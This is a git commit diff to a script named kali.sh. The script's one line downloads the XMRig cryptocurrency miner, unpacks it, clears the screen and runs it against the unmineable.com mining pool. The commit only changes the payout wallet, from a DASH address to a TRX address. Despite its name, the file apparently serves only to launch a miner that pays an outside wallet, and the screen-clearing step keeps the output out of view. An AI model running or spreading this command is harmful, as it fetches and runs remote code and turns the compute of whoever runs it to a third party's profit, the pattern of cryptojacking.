3e45a7baecec91cef05c17c060ae2e6c242e496f
TimeTravellingMachine <149077424+TimeTravellingMachine@users.noreply.github.com>
2023-11-02 13:08:02 +0530

    Update kali.sh

--- kali.sh
+++ kali.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DASH:Xcrv7nUSpWy1B4bjA3AJijUdoZEbTShun4.v1 -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TUfEFRwukdgci259qg7KwT6c1HrB2AdMCB.v1 -p x
